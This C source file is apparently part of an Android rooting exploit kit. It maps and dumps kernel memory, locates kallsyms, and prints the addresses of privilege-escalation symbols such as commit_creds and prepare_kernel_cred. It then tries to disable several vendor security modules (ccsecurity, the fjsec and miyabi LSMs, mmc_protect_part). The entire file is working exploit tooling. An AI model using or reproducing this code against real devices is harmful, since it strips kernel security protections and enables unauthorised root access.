#define _LARGEFILE64_SOURCE
#include <stdio.h>
#include <stdlib.h>

#include "kernel_memory.h"
#include "libkallsyms/kallsyms_in_memory.h"
#include "ccsecurity.h"
#include "reset_security_ops.h"
#include "lsm_capability.h"
#include "mmc_protect_part.h"

#define CHECK_SYMBOL    "printk"


static bool
check_is_kallsyms_in_memory_working(kallsyms *info)
{
  unsigned long addr;
  const char *name;

  addr = kallsyms_in_memory_lookup_name(info, CHECK_SYMBOL);
  name = kallsyms_in_memory_lookup_address(info, addr);

  if (strcmp(name, CHECK_SYMBOL) != 0) {
    return false;
  }

  return true;
}

static bool
show_essential_address(kallsyms *info)
{
  static const char *essential_symbols[] = {
    "prepare_kernel_cred",
    "commit_creds",
    "ptmx_fops",
    "remap_pfn_range",
    "vmalloc_exec",
    NULL
  };
  const char **name;
  bool ret = false;

  printf("Essential symbols are:\n");
  for (name = essential_symbols; *name; name++) {
    unsigned long addr;

    addr = kallsyms_in_memory_lookup_name(info, *name);
    if (addr) {
      printf("  %s = 0x%08x\n", *name, addr);
      ret = true;
    }
  }
  printf("\n");

  return ret;
}

static bool
do_unlock(kallsyms *info)
{
  bool success = false;

  printf("Checking mmc_protect_part...\n");
  if (has_mmc_protect_part(info)) {
    printf("Found mmc_protect_part.\n");

    if (!unlock_mmc_protect_part(info)) {
      goto unlock_failed;
    }
  }

  printf("Checking ccsecurity...\n");
  if (has_ccsecurity(info)) {
    printf("Found ccsecurity.\n");

    if (unlock_ccsecurity(info)) {
      goto unlock_success;
    }

    goto unlock_failed;
  }

  printf("Checking fjsec LSM...\n");
  if (has_fjsec_lsm(info)) {
    printf("Found fjsec LSM.\n");

    if (unlock_fjsec_lsm(info)) {
      goto unlock_success;
    }

    goto unlock_failed;
  }

  printf("Checking miyabi LSM...\n");
  if (has_miyabi_lsm(info)) {
    printf("Found miyabi LSM.\n");

    if (unlock_miyabi_lsm(info)) {
      goto unlock_success;
    }

    goto unlock_failed;
  }

  printf("Checking reset_security_ops...\n");
  if (has_reset_security_ops(info)) {
    printf("Found reset_security_ops. Run it.\n");
    if (run_reset_security_ops(info)) {
      printf("OK.\n\n");
      success = true;
    }
    else {
      printf("Failed.\n\n");
    }
  }

  if (success) {
    goto unlock_success;
  }

  printf("\nSecurity module is not found.\n");
  return false;

unlock_failed:
  printf("Failed unlock LSM.\n");
  return false;

unlock_success:
  printf("\nUnlocked LSM.\n");
  return true;
}

static bool
do_dump_kernel(void)
{
  unsigned char *mapped_address;
  FILE *fp;
  int i;

  fp = fopen("kernel.dump", "rb");
  if (fp) {
    fclose(fp);
    return false;
  }

  fp = fopen("kernel.dump", "wb");
  if (!fp) {
    return false;
  }

  mapped_address = convert_to_kernel_mapped_address((void *)KERNEL_BASE_ADDRESS);

  for (i = 0; i < KERNEL_MEMORY_SIZE; i += 1024) {
    if (fwrite(&mapped_address[i], 1024, 1, fp) != 1) {
      break;
    }
  }

  fclose(fp);

  return true;
}

int
main(int argc, char **argv)
{
  void *mapped_address;
  kallsyms *info;

  printf("Mapping kernel memory...\n");
  if (!map_kernel_memory()) {
    printf("Failed.\n");
    exit(EXIT_FAILURE);
  }
  printf("OK.\n\n");

  printf("Dump kernel memory...\n");
  if (do_dump_kernel()) {
    printf("Dumped.\n");
  }
  printf("\n");

  printf("Finding kallsyms address in memory...\n");
  mapped_address = convert_to_kernel_mapped_address((void *)KERNEL_BASE_ADDRESS);
  info = kallsyms_in_memory_init(mapped_address, KERNEL_MEMORY_SIZE);
  if (info) {
    printf("Checking kallsyms_in_memory working...\n");

    if (check_is_kallsyms_in_memory_working(info)) {
      printf("OK. Ready to unlock security module.\n\n");

      show_essential_address(info);

      do_unlock(info);
    }
    else {
      printf("kallsyms_in_memory doesn't work\n");
    }

    kallsyms_in_memory_free(info);
  }
  else {
    printf("Failed: Lookup kallsyms in memory.\n");
  }

  unmap_kernel_memory();

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
